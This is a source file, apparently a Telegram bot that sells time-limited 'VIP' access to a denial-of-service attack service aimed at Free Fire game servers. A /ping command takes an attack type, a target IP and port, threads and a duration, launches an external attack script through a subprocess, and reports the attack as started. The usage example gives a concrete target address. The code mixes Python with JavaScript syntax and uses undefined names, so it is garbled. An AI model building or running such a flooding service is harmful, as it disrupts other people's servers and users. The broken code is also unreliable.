```python
import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import readline
import chalk
import gradient
import figlet
import axios
import fs
import path

# Función para mostrar el tutorial de obtención del token
def mostrarTutorial():
    print(chalk.yellowBright("\nTutorial para obtener el token de bot de Telegram:"))
    print("1. Abre Telegram y busca 'BotFather'.")
    print("2. Inicia una conversación con BotFather y sigue las instrucciones para crear un nuevo bot.")
    print("3. Una vez creado, copia el token generado y pégalo cuando se solicite.\n")

# Función para pedir el token
def pedirToken():
    return new Promise((resolve) => {
        rl.question("Por favor, ingresa tu token de bot de Telegram: ", (token) => {
            resolve(token.trim())
        })
    })

# Función para validar el token
async def validarToken(token):
    try:
        bot = telebot.TeleBot(token)
        await bot.get_me()  # Intenta conectarte a la API de Telegram con el token proporcionado
        print(chalk.greenBright("Token válido. Iniciando el bot...\n"))
        return True
    except error:
        print(chalk.redBright("Token inválido. Intenta nuevamente.\n"))
        return False

# Función para obtener el token
async def obtenerToken():
    while True:
        await mostrarMenu()
        
        opcion = await new Promise((resolve) => {
            rl.question(chalk.bold.magentaBright('---> '), (input) => {
                resolve(input.trim())
            })
        })

        if opcion === '1':
            mostrarTutorial()
            await new Promise(resolve => setTimeout(resolve, 3000))  # Espera 3 segundos después del tutorial

        if opcion === '2':
            token = await pedirToken()
            esValido = await validarToken(token)

            if esValido:
                return token
        else if opcion !== '1' && opcion !== '2':
            print(chalk.redBright("Opción no válida. Por favor, selecciona 1 o 2.\n"))

# Iniciar el bot con el token válido
async def iniciarBot():
    token = await obtenerToken()
    
    # Mostrar los mensajes una vez que el token es válido
    print(chalk.blue('Iniciando✨...'))
    print(gradient.pastel.multiline(figlet.textSync('Alfa TG', { horizontalLayout: 'default' })))
    print(chalk.green('CREADOR EliasarYT: puro nica papa'))

    bot = telebot.TeleBot(token)

    # Comando /start
    @bot.message_handler(commands=["start"])
    def handle_start(message):
        telegram_id = message.from_user.id

        with db_lock:
            cursor.execute(
                "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
                (telegram_id,),
            )
            result = cursor.fetchone()

        if result:
            expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
            if datetime.now() > expiration_date:
                vip_status = "❌ *Seu plano VIP expirou.*"
            else:
                dias_restantes = (expiration_date - datetime.now()).days
                vip_status = (
                    f"✅ VOCÊ É VIP!\n"
                    f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
                    f"📅 Expira em: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
                )
        else:
            vip_status = "❌ *Você não possui um plano VIP ativo.*"
        markup = InlineKeyboardMarkup()
        button = InlineKeyboardButton(
            text="💻 SUPORTE - OFICIAL 💻",
            url=f"tg://user?id={ADMIN_ID}"

        )
        markup.add(button)
        
        bot.reply_to(
            message,
            (
                "🤖 *Bem-vindo ao Bot de Ping MHDDoS [Free Fire]!*"
                

                f"""
```
{vip_status}```\n"""
                "📌 *Como usar:*"
                """
```
/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
                "💡 *Exemplo:*"
                """
```
/ping UDP 143.92.125.230:10013 10 900```\n"""
                "⚠️ *Atenção:* Este bot foi criado apenas para fins educacionais."
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )

    # Comando /addvip
    @bot.message_handler(commands=["addvip"])
    def handle_addvip(message):
        if message.from_user.id != ADMIN_ID:
            bot.reply_to(message, "❌ Você não tem permissão para usar este comando.")
            return

        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(
                message,
                "❌ Formato inválido. Use: `/addvip <ID> <QUANTOS DIAS>`",
                parse_mode="Markdown",
            )
            return

        telegram_id = args[1]
        days = int(args[2])
        expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

        with db_lock:
            cursor.execute(
                """
                INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
                VALUES (?, ?)
                """,
                (telegram_id, expiration_date),
            )
            conn.commit()

        bot.reply_to(message, f"✅ Usuário {telegram_id} adicionado como VIP por {days} dias.")

    # Comando /ping
    @bot.message_handler(commands=["ping"])
    def handle_ping(message):
        telegram_id = message.from_user.id

        with db_lock:
            cursor.execute(
                "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
                (telegram_id,),
            )
            result = cursor.fetchone()

        if not result:
            bot.reply_to(message, "❌ Você não tem permissão para usar este comando.")
            return

        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            bot.reply_to(message, "❌ Seu acesso VIP expirou.")
            return

        if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
            bot.reply_to(message, "❌ Aguarde 20 segundos antes de usar este comando novamente.")
            return

        args = message.text.split()
        if len(args) != 5 or ":" not in args[2]:
            bot.reply_to(
                message,
                (
                    "❌ *Formato inválido!*\n\n"
                    "📌 *Uso correto:*\n"
                    "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                    "💡 *Exemplo:*\n"
                    "`/ping UDP 143.92.125.230:10013 10 900`"
                ),
                parse_mode="Markdown",
            )
            return

        attack_type = args[1]
        ip_port = args[2]
        threads = args[3]
        duration = args[4]
        command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
                f"📍 *IP/Host:Porta:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Threads:* {threads}\n"
                f"⏳ *Tempo (ms):* {duration}\n"
                f"💻 *Comando executado:* `ping`\n\n"
                f"*⚠️ Atenção! Este bot foi criado por* https://t.me/wsxteamorg"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )

    # Callback para detener el ataque
    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
    def handle_stop_attack(call):
        telegram_id = int(call.data.split("_")[1])

        if call.from_user.id != telegram_id:
            bot.answer_callback_query(
                call.id, "❌ Apenas o usuário que iniciou o ataque pode pará-lo."
            )
            return

        if telegram_id in active_attacks:
            process = active_attacks[telegram_id]
            process.terminate()
            del active_attacks[telegram_id]

            bot.answer_callback_query(call.id, "✅ Ataque parado com sucesso.")
            bot.edit_message_text(
                "*[⛔] ATAQUE ENCERRADO [⛔]*",
                chat_id=call.message.chat.id,
                message_id=call.message.id,
                parse_mode="Markdown",
            )
            time.sleep(3)
            bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
        else:
            bot.answer_callback_query(call.id, "❌ Nenhum ataque ativo encontrado.")

    # Iniciar el bot
    bot.infinity_polling()

# Llamar a la función para iniciar el bot
iniciarBot()
```
